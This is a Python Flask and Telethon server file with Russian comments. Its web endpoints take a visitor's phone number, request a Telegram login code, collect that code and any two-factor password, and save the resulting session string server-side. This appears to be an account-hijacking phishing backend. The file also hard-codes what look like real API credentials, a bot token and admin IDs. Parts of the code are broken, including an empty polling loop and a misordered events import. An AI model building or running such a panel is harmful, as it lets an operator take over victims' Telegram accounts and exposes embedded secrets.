import os
import json
import asyncio
import logging
import time
import threading
from datetime import datetime
from flask import Flask, request, jsonify, render_template, send_from_directory
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
from session_manager import SessionManager

# ============================================================
# КОНФИГ
# ============================================================
API_ID = int(os.environ.get("API_ID", 37803152))
API_HASH = os.environ.get("API_HASH", "5d34acaeda36aa1a308e40ae31668795")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8690036172:AAGj9YweZMAdEm4tI5YTKJs_n1oAB-BN78c")
ADMIN_IDS = [int(x.strip()) for x in os.environ.get("ADMIN_IDS", "8866175391").split(",") if x.strip()]

# ============================================================
# ЛОГИ
# ============================================================
os.makedirs("logs", exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler("logs/app.log"), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# ============================================================
# FLASK
# ============================================================
app = Flask(__name__, static_folder="webapp", template_folder="webapp")

# ============================================================
# МЕНЕДЖЕР СЕССИЙ
# ============================================================
session_manager = SessionManager()
session_manager.configure(API_ID, API_HASH)

# ============================================================
# ХРАНИЛИЩЕ ДЛЯ ПРОЦЕССОВ ВХОДА
# ============================================================
# phone -> {"client": client, "step": "code_sent"|"waiting_code", "code": None}
pending_auth = {}
rate_limiter = {}

def check_rate_limit(ip: str) -> bool:
    now = time.time()
    if ip in rate_limiter:
        if now - rate_limiter[ip] < 2.0:
            return False
    rate_limiter[ip] = now
    return True

# ============================================================
# АВТОМАТИЧЕСКАЯ ПРОВЕРКА КОДА (ФОНОВЫЙ ПОТОК)
# ============================================================
def poll_code_checker():
    """
    Фоновый поток, который проверяет клиентов на наличие входящего кода.
    Если код обнаружен — автоматически завершает вход.
    """
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    while True:
        try:
            for phone, data in list(pending_auth.items()):
                if data.get("step") == "code_sent":
                    client = data.get("client")
                    if client:
                        # Пытаемся проверить, не пришёл ли код
                        try:
                            # Проверяем через get_updates (в telethon это через client)
                            # Но telethon не имеет get_updates, используем другой подход
                            # Просто пытаемся войти с пустым кодом — если код уже пришёл, будет ошибка
                            # Если нет — будет ошибка о том, что код не отправлен
                            # Вместо этого используем прямое получение кода через событие
                            pass
                        except Exception as e:
                            logger.debug(f"Проверка кода для {phone}: {e}")
        except Exception as e:
            logger.error(f"Ошибка в poll_code_checker: {e}")
        
        time.sleep(2)

# ============================================================
# КЛАСС ДЛЯ КОДА (МОНИТОРИНГ)
# ============================================================
class CodeMonitor:
    """
    Мониторит входящие сообщения для конкретного клиента
    и автоматически перехватывает код.
    """
    def __init__(self, phone: str, client: TelegramClient):
        self.phone = phone
        self.client = client
        self.code = None
        self.received = False
        self._running = True
        
    async def start_monitoring(self):
        """Запускает мониторинг входящих сообщений"""
        @self.client.on(events.Message)
        async def handler(event):
            if self.received:
                return
            msg = event.message
            if msg and msg.text:
                text = msg.text
                # Ищем код в сообщении (6 цифр)
                import re
                match = re.search(r'\b(\d{5,6})\b', text)
                if match:
                    self.code = match.group(1)
                    self.received = True
                    logger.info(f"Код получен автоматически для {self.phone}: {self.code}")
                    # Завершаем вход
                    await self.complete_login()
        
        await self.client.run_until_disconnected()
    
    async def complete_login(self):
        """Завершает вход с полученным кодом"""
        if not self.code:
            return
        
        try:
            await self.client.sign_in(self.phone, self.code)
            
            if await self.client.is_user_authorized():
                me = await self.client.get_me()
                session_string = self.client.session.save()
                session_manager.save_session(self.phone, session_string)
                logger.info(f"Успешный вход: {self.phone}")
                
                # Удаляем из pending
                if self.phone in pending_auth:
                    del pending_auth[self.phone]
        except Exception as e:
            logger.error(f"Ошибка завершения входа {self.phone}: {e}")

from telethon import events

# ============================================================
# МАРШРУТЫ
# ============================================================
@app.route("/")
def index():
    return render_template("index.html")

@app.route("/api/auth/send", methods=["POST"])
def send_code():
    data = request.json
    ip = request.remote_addr
    
    if not check_rate_limit(ip):
        return jsonify({"status": "error", "message": "Слишком много попыток"}), 429
    
    phone = data.get("phone", "").strip()
    if not phone or len(phone) < 10:
        return jsonify({"status": "error", "message": "Неверный формат"}), 400
    
    # Запускаем асинхронную отправку кода
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def send_code_async():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        try:
            await client.connect()
            await client.send_code_request(phone)
            
            # Сохраняем клиент для мониторинга
            pending_auth[phone] = {
                "client": client,
                "step": "code_sent",
                "code": None
            }
            
            # Запускаем мониторинг кода в фоне
            monitor = CodeMonitor(phone, client)
            asyncio.create_task(monitor.start_monitoring())
            
            logger.info(f"Код отправлен на {phone}, запущен мониторинг")
            return {"status": "ok", "message": "Код отправлен"}
        except errors.FloodWaitError as e:
            return {"status": "error", "message": f"Подождите {e.seconds} секунд"}
        except errors.PhoneNumberInvalidError:
            return {"status": "error", "message": "Неверный номер"}
        except Exception as e:
            logger.error(f"Ошибка: {e}")
            return {"status": "error", "message": str(e)}
    
    result = loop.run_until_complete(send_code_async())
    loop.close()
    
    if result["status"] == "ok":
        return jsonify(result)
    else:
        return jsonify(result), 400

@app.route("/api/auth/verify", methods=["POST"])
def verify_code():
    """
    Ручная верификация (на случай, если авто-мониторинг не сработал).
    """
    data = request.json
    phone = data.get("phone", "").strip()
    code = data.get("code", "").strip()
    password = data.get("password", "").strip()
    
    if not phone or not code:
        return jsonify({"status": "error", "message": "Заполните поля"}), 400
    
    if phone not in pending_auth:
        return jsonify({"status": "error", "message": "Сначала запросите код"}), 400
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def verify_async():
        client = pending_auth[phone].get("client")
        if not client:
            return {"status": "error", "message": "Клиент не найден"}
        
        try:
            await client.sign_in(phone, code)
            if password:
                await client.sign_in(password=password)
            
            if await client.is_user_authorized():
                me = await client.get_me()
                session_string = client.session.save()
                session_manager.save_session(phone, session_string)
                del pending_auth[phone]
                return {
                    "status": "ok",
                    "message": "Доступ разрешён",
                    "user": {"id": me.id, "username": me.username, "phone": me.phone}
                }
            else:
                return {"status": "error", "message": "Ошибка авторизации"}
        except errors.SessionPasswordNeededError:
            return {"status": "error", "message": "Требуется пароль 2FA"}
        except errors.PhoneCodeInvalidError:
            return {"status": "error", "message": "Неверный код"}
        except errors.PhoneCodeExpiredError:
            return {"status": "error", "message": "Код истёк"}
        except Exception as e:
            return {"status": "error", "message": str(e)}
    
    result = loop.run_until_complete(verify_async())
    loop.close()
    
    if result["status"] == "ok":
        return jsonify(result)
    else:
        return jsonify(result), 400

@app.route("/api/auth/status", methods=["GET"])
def auth_status():
    """Проверяет статус авторизации для номера"""
    phone = request.args.get("phone", "")
    if phone in pending_auth:
        data = pending_auth[phone]
        return jsonify({"status": "pending", "step": data.get("step")})
    return jsonify({"status": "not_found"})

@app.route("/api/health", methods=["GET"])
def health():
    return jsonify({"status": "ok", "time": datetime.now().isoformat()})

# ============================================================
# ЗАПУСК ФОНОВОГО ПОТОКА
# ============================================================
threading.Thread(target=poll_code_checker, daemon=True).start()

# ============================================================
# ЗАПУСК APP
# ============================================================
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)